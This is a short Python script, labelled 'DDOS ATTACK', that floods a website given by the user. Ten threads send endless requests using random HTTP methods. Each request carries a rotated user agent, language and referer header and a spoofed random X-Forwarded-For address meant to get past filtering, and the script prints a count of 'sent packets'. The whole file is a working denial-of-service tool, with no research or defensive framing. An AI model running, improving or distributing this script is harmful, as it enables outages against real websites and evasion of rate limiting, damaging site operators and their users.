import requests
import threading
import random
import time
import sys
from colorama import Fore, Style, init

init()

url = input("Enter the website: ")

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
]

accept_languages = [
    "en-US,en;q=0.9",
    "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
    "fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4",
    "de-DE,de;q=0.9,en-US;q=0.7,en;q=0.5",
]

referers = [
    "https://google.com",
    "https://yahoo.com",
    "https://bing.com",
    "https://duckduckgo.com",
]

def random_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

http_methods = ["GET", "POST", "PUT", "DELETE"]

example_data = {"key": "value"}

def print_3d_title():
    title = "= DDOS ATTACK ="
    
    frame = "═" * (len(title) + 4)
    
    print(f"\n{Fore.YELLOW}{Style.BRIGHT}{frame}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{Style.BRIGHT}║ {Fore.MAGENTA}{title}{Fore.YELLOW} ║{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}{Style.BRIGHT}{frame}{Style.RESET_ALL}")

def send_requests(packet_count):
    while True:
        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept-Language": random.choice(accept_languages),
                "Referer": random.choice(referers),
                "X-Forwarded-For": random_ip(),
            }
            
            method = random.choice(http_methods)
            
            if method == "GET":
                response = requests.get(url, headers=headers)
            elif method == "POST":
                response = requests.post(url, headers=headers, json=example_data)
            elif method == "PUT":
                response = requests.put(url, headers=headers, json=example_data)
            elif method == "DELETE":
                response = requests.delete(url, headers=headers)

            if 200 <= response.status_code < 300:
                packet_count[0] += 1
                print(f"{Fore.RED}- DDOS ATTACK - {Fore.RESET} # Sent packets: {packet_count[0]}")

        except Exception as e:
            print(f"Hata: {e}")

def start_test(thread_count=10):
    threads = []
    packet_count = [0] 

    print_3d_title()

    for _ in range(thread_count):
        t = threading.Thread(target=send_requests, args=(packet_count,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()
        
if __name__ == "__main__":
    start_test(thread_count=10)
